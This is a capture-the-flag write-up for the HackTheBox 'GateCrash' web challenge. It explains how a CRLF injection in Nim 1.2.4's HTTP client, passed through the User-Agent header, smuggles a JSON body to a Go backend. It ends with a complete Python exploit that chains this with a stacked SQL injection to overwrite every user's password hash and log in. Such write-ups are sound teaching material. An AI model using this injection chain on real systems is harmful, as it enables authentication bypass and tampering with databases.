---
layout: writeup
parent: "HackTheBox University CTF: Brains & Bytes"
grand_parent: 2023
author: gianlu33
category: web
tags: sql-injection
title: "GateCrash"
subtitle: ""
write_date: 2023-12-11
last_edit_date: 2023-12-11
# layout: mathjax # Uncomment this line to enable MathJax
---

>An administrative portal for the campus parking area has been identified,
>bypassing it's authentication and gaining access to the gate control would allow
>us to unlock it and use staff vehicles for securing the campus premises way
>faster.

Backup of the challenge source code available
[here](/assets/challenge-sources/2023/hackthebox-university-ctf-brains-bytes/web_gatecrash.zip).

## Introduction

This challenge gives us a login prompt where we need to insert valid credentials
in order to get the flag.

By analyzing the source code, we discover that this application is composed of
two parts:
- A _Nimble_ frontend, available at `localhost:1337`
- A _Go_ backend, not accessible by external users (i.e., all requests should go
  through the frontend)

The Go backend is also responsible for initializing a list of users that is
stored in a SQLite database.

## Frontend

The frontend seems pretty simple: the main endpoint `/` returns the HTML webpage
showing the login screen, while the `/user` POST endpoint is used for the actual
logic of the logic. 

This endpoint expects username and password encoded as a normal login form
(`application/x-www-form-urlencoded`). The function then makes sure that
username and password do not contain SQL injection, and then forwards the
request to the backend, this time encoding the login data as a JSON object.

If the login is successful (i.e., the backend replies with `200`) the frontend
sends the flag as a response. Here is the full implementation of the login
function in the frontend:

```nim
post "/user":
    let username = @"username"
    let password = @"password"

    if containsSqlInjection(username) or containsSqlInjection(password):
      resp msgjson("Malicious input detected")

    let userAgent = decodeUrl(request.headers["user-agent"])

    let jsonData = %*{
      "username": username,
      "password": password
    }

    let jsonStr = $jsonData

    let client = newHttpClient(userAgent)
    client.headers = newHttpHeaders({"Content-Type": "application/json"})

    let response = client.request(userApi & "/login", httpMethod = HttpPost, body = jsonStr)

    if response.code != Http200:
      resp msgjson(response.body.strip())
       
    resp msgjson(readFile("/flag.txt"))
```

The `containsSqlInjection` function is supposed to block all characters that are
not alphanumeric. Its implementation seems correct: there is no way we can
inject malicious payloads within the username and password fields.

Interestingly, the same user agent used in the request is also used in the
request to the backend with no additional checks performed. More interestingly,
the header is decoded with the
[decodeUrl](https://nim-lang.org/docs/uri.html#decodeUrl%2Cstring) function,
which seems suspicious. Let's see later if we can use this to our advantage.

## Backend

During startup, the backend will seed the database with ten accounts having
random usernames and passwords. Each value is a random 32-byte string. Passwords
are stored in hashed form using `bcrypt`. Here, using brute force does not seem
to be a good idea.

```go
func seedDatabase() {
	createTable := `
	CREATE TABLE IF NOT EXISTS users (
		id INTEGER PRIMARY KEY AUTOINCREMENT,
		username TEXT NOT NULL,
		password TEXT NOT NULL
	);
	`

	_, err := db.Exec(createTable)
	if err != nil {
		log.Fatal(err)
	}

	for i := 0; i < 10; i++ {
		newUser, _ := randomHex(32)
		newPass, _ := randomHex(32)

		hashedPassword, err := bcrypt.GenerateFromPassword([]byte(newPass), bcrypt.DefaultCost)
		if err != nil {
			fmt.Println(err)
			return
		}

		_, err = db.Exec("INSERT INTO users (username, password) VALUES ('" + newUser + "', '" + string(hashedPassword) + "');")
		if err != nil {
			fmt.Println(err)
			return
		}
	}
}
```

The frontend calls the backend's `/login` endpoint containing the user's login
request. Here, the backend  performs two checks. First, it ensures that the user
agent is among the allowed ones:

```go
for _, userAgent := range allowedUserAgents {
    if strings.Contains(r.Header.Get("User-Agent"), userAgent) {
        found = true
        break
    }
}

if !found {
    http.Error(w, "Browser not supported", http.StatusNotAcceptable)
    return
}
```

This is quite suspicious for two reasons:
1. It doesn't really make sense to check the user agent, as it is easy to
   bypass,
2. The check doesn't match the exact string, but only checks if one of the
   allowed user agents _is included_ in the `User-Agent` header.

The second check is to verify that username and password are correct. This is
done via a SQL query:

```go
row := db.QueryRow("SELECT * FROM users WHERE username='" + user.Username + "';")
err = row.Scan(&user.ID, &user.Username, &user.Password)
if err != nil {
    http.Error(w, "Invalid username", http.StatusUnauthorized)
    return
}

err = bcrypt.CompareHashAndPassword([]byte(user.Password), []byte(userPassword))
if err != nil {
    http.Error(w, "Invalid password", http.StatusUnauthorized)
    return
}
```

Here, the query is not sanitized, which opens the doors for a SQL injection.
However, username and password are checked by the frontend, and apparently there
is no way to bypass that. Right?

## Solution

### Finding the vulnerability
 
By inspecting the Dockerfile, we can see that the frontend uses Nim 1.2.4. A
quick google search shows that this version has a serious
[vulnerability](https://nvd.nist.gov/vuln/detail/CVE-2020-15693):

>In Nim 1.2.4, the standard library httpClient is vulnerable to a CR-LF
>injection in the target URL. An injection is possible if the attacker controls
>any part of the URL provided in a call (such as httpClient.get or
>httpClient.post), the User-Agent header value, or custom HTTP header names or
>values.

Great! So we can exploit this vulnerability to inject malicious payloads in the
user agent header. But how can we use it to our advantage?

First, let's try if this vulnerability can be really exploited:

```py
def send_post_request(url, headers, data):
    x = requests.post(url, headers=headers, data=data)
    print(x.status_code)
    print(x.text)

headers = {
    'Content-Type': 'application/x-www-form-urlencoded',
    "User-Agent": "Mozilla/7.0%0d%0aHello: test",
}

payload = b"username=aaaa&password=aa"

send_post_request("http://localhost:1337/user", headers, payload)
```

Note that I encoded the `\r\n` characters into `%0d%0a`, otherwise the exploit
would not work. In any case, the user agent is kindly decoded by the frontend
before sending it to the backend (now it should be clear why they added that
`decodeUrl` call!).

By instrumenting the source code in the backend, we can see that indeed the
backend receives an additional `Hello` header! This is quite promising!

### Performing the SQL Injection

Now, the question is: how to exploit the user-agent vulnerability to bypass the
login and obtain the flag? Here the idea: what if we inject the body of the
request (i.e., username and password) in the `User-Agent` header? This way we
could bypass the `containsSqlInjection` checks and perform our SQL injection!

Since the frontend sends to the backend the body as JSON, our payload should be
a JSON object containing the username and password. 

Let's first try something simple to see if it indeed works. First, let's try to
bypass the username. I modified the source code to print different messages when
the checks for username or password fail, so we can distinguish them. This is
the payload:

```py
headers = {
    'Content-Type': 'application/x-www-form-urlencoded',
    "User-Agent": "Mozilla/7.0%0d%0a%0d%0a{\"username\":\"' OR '1'='1\"}",
}
```

Trying to re-run the script and... it works!

Now, to bypass the password, an idea would be to add an user with username and
password of our choice, which can we use later to login and get the flag. For
some reason, adding users did not work for me, so instead I modified all
existing users setting the same username `a` and password `b`. 

Note: the password is hashed with `bcrypt`! So we have to store the hashed
version of the password to the database. To get a valid hash of the password, we
can simply reproduce the same Go code and print out the hashed version of `b`,
which turns out it is equal to
`$2a$10$OMv7TKyoqShcmWryPU9syOMr6PygopMySxuTfTcWZHy7fo/VS577S` (this includes
the salt).

The last thing to be aware of is that the request from frontend to backend will
have a `Content-Length` that depends on the input username and password (the
*real* ones, not the ones injected via the user-agent). If we do not pass any
body, or if our username and password are too short, the request to the backend
will be truncated and part of our payload will be lost. Therefore, it is
important to send a body large enough to the frontend.

Now we have everything we need to get the flag! Here is the complete exploit:

```py
import requests

URL = "http://localhost:1337/user" # replace with remote server

def send_post_request(url, headers, data):
    x = requests.post(url, headers=headers, data=data)
    print(x.status_code)
    print(x.text)

# SQL Injection: set all users' usernames to `a` and passwords to `b`
send_post_request(
    URL,
    {
        'Content-Type': 'application/x-www-form-urlencoded',
        "User-Agent": "Mozilla/7.0%0d%0a%0d%0a{\"username\":\"'; UPDATE users SET username = 'a', password = '$2a$10$OMv7TKyoqShcmWryPU9syOMr6PygopMySxuTfTcWZHy7fo/VS577S' WHERE '1'='1\"}",
    },
    b"username=aaaa&password="+ b"a" * 1024 # the body should be at least as big as the payload in the user-agent header, otherwise errors will occur
)

# Getting the flag by performing a valid login
send_post_request(
    URL,
    {
        'Content-Type': 'application/x-www-form-urlencoded',
        "User-Agent": "Mozilla/7.0",
    },
    b"username=a&password=b"
)
```

Output:

```
200
{"msg": "Invalid username or password"}
200
{"msg": "HTB{d0_th3_d45h_0n_th3_p4r53r}"}
```
